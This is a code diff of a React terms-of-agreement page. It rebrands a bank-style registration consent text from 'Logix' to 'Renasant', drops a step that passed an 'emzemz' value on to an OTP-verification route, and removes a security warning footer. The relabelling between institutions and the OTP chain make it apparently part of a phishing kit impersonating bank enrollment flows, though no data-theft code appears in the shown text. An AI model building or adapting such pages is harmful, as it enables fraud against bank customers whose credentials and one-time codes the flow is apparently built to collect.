@@ -1,12 +1,12 @@
 import React, { useState } from 'react';
-import { useNavigate, useLocation } from 'react-router-dom';
+import { useNavigate } from 'react-router-dom';
+import FlowCard from '../components/FlowCard';
 
 const Terms: React.FC = () => {
   const [isChecked, setIsChecked] = useState(false);
   const [isLoading, setIsLoading] = useState(false);
   const [errorMessage, setErrorMessage] = useState('');
   const navigate = useNavigate();
-  const location = useLocation();
 
   const handleCheckboxChange = () => {
     setIsChecked(!isChecked);
@@ -23,49 +23,40 @@ const Terms: React.FC = () => {
 
       // Simulate API request or loading delay
       setTimeout(() => {
-            setIsLoading(false); // End loading state
-        const { emzemz } = location.state || {};
-        navigate('/otp-verification', { state: { emzemz } });
-      }, 2000);
+        setIsLoading(false);
+        navigate('/', { replace: true });
+      }, 1500);
     } else {
       setErrorMessage('Please agree to the terms before proceeding.');
     }
   };
 
   return (
-    <div className="flex-1 bg-gray-200 rounded shadow-sm">
-   
+    <FlowCard title="Terms of Agreement">
+      <p className="text-sm mb-4">
+        By submitting this registration form, I understand that I am
+        providing written instructions in accordance with the Fair Credit
+        Reporting Act, Driver Privacy Protection Act, and other applicable
+        law for Renasant and its affiliates to request and receive
+        information about me from third parties, including but not limited
+        to a copy of my consumer credit report, score, and motor vehicle
+        records from consumer reporting agencies, at any time for so long
+        as I have an active account.
+      </p>
 
-           <div className="border-b-2 border-teal-500 px-8 py-4">
-        <h2 className="text-xl font-semibold text-gray-800">Terms of Agreement</h2>
-      </div>
+      <p className="text-sm mb-6">
+        I further authorize Renasant and its affiliates to retain a copy
+        of my information for use in accordance with Renasant's
+        <a href="#" className="text-blue-700 hover:underline">
+          {' '}Terms of Service
+        </a>{' '}
+        and{' '}
+        <a href="#" className="text-blue-700 hover:underline">
+          Privacy Statement
+        </a>.
+      </p>
 
-
-      <div className="px-6 py-6 bg-white space-y-4">
-        <p className="text-sm mb-4">
-          By submitting this registration form, I understand that I am
-          providing written instructions in accordance with the Fair Credit
-          Reporting Act, Driver Privacy Protection Act, and other applicable
-          law for Logix and its affiliates to request and receive
-          information about me from third parties, including but not limited
-          to a copy of my consumer credit report, score, and motor vehicle
-          records from consumer reporting agencies, at any time for so long
-          as I have an active account.
-        </p>
-
-        <p className="text-sm mb-6">
-          I further authorize Logix and its affiliates to retain a copy
-          of my information for use in accordance with Logix's
-          <a href="#" className="text-blue-700 hover:underline">
-            {' '}Terms of Service
-          </a>{' '}
-          and{' '}
-          <a href="#" className="text-blue-700 hover:underline">
-            Privacy Statement
-          </a>.
-        </p>
-
-        <form onSubmit={handleSubmit}>
+      <form onSubmit={handleSubmit} className="space-y-4">
           <div className="mt-7">
             <label className="flex gap-2 mb-4 items-center">
               <input
@@ -85,29 +76,21 @@ const Terms: React.FC = () => {
                 <span>{errorMessage}</span>
               </div>
             )}
-        <div className="border-b-2 border-teal-500 justify-center text-center px-6 py-4">
-            {!isLoading ? (
-              <button
-                type="submit"
-                className="bg-gray-600 hover:bg-gray-700 text-white px-16 py-2 text-sm rounded"
-              >
-                Continue
-              </button>
-            ) : (
-              <div className="h-10 w-10 animate-spin rounded-full border-4 border-solid border-gray-600 border-t-transparent"></div>
-            )}
-          </div>
+            <div className="flex justify-center pt-2">
+              {!isLoading ? (
+                <button
+                  type="submit"
+                  className="bg-[#0f4f6c] hover:bg-[#0c4057] text-white px-12 py-2 text-sm rounded"
+                >
+                  Continue
+                </button>
+              ) : (
+                <div className="h-10 w-10 animate-spin rounded-full border-4 border-solid border-[#0f4f6c] border-t-transparent"></div>
+              )}
+            </div>
           </div>
         </form>
-      </div>
-
-      <div className="px-6 py-4 bg-gray-100 border-t border-gray-200">
-        <p className="text-xs text-gray-600 text-center">
-          For security reasons, never share your personal information with anyone unless you are certain
-          who you are providing that information to, and only share information through a secure webpage or site.
-        </p>
-      </div>
-    </div>
+    </FlowCard>
   );
 };
 
